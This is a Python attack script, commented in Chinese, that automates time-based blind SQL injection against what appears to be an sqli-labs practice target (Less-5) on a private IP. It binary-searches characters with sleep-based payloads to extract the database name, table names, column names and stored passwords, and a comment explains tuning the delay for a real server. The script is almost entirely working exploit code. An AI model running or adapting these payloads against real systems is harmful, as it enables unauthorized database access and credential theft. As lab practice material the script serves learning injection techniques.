#适用于时间盲注
import requests
import time
import datetime

url='http://192.168.31.217:81/Less-5/?id=4\' and '
tail=' -- a' #注释尾缀
print(url)

flag=""
for i in range(1,1000):
    begin=32
    end=126
    mid=(begin+end)//2      #用二分法查找 ,//表示除法向下取整，会出小数
    while(begin<end):
        print(f"begin:{begin},mid:{mid},end{end}")
        #payload=f"if(ascii(substr((select(database())),{i},1))>{mid},sleep(2),1)"  #爆破数据库名
        #payload=f"if((ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{i},1))>{mid}),sleep(2),1)"  #爆破列名
        #payload=f"if((ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='emails')),{i},1))>{mid}),sleep(2),1)" #爆破字段
        #payload=f"if((ascii(substr((select(group_concat(password))from(F1naI1y)),{i},1))>{mid}),sleep(2),1)"  #爆密码
        payload=f"if((ascii(substr((select(password)from(F1naI1y)where(username='flag')),{i},1))>{mid}),sleep(2),1)"
        mix=url+payload+tail
        print(mix)
        time_begin=datetime.datetime.now()
        r=requests.get(mix)
        time_end=datetime.datetime.now()
        spend=(time_end-time_begin).seconds
        print(f"睡眠时间为：{spend+1}")
        if(spend+1>=2):     #说明这个条件正确，这里spend+1是因为second这个函数向下取整，经测试加一秒差不多为真实睡眠时间，当然如果真实服务器，考虑到网络延迟，会造成误差，可以延长payload里sleep的时间，比如改成3，4秒，然后这里也改条件
            begin=mid+1
            mid=(begin+end)//2
        else:     #说明不正确
            end=mid
            mid=(begin+end)//2
        time.sleep(0.2)
    flag+=chr(mid)
    print(flag)
    if(begin==32):  #说明这个字符不存在了，已经全部爆出
        break
        print("")
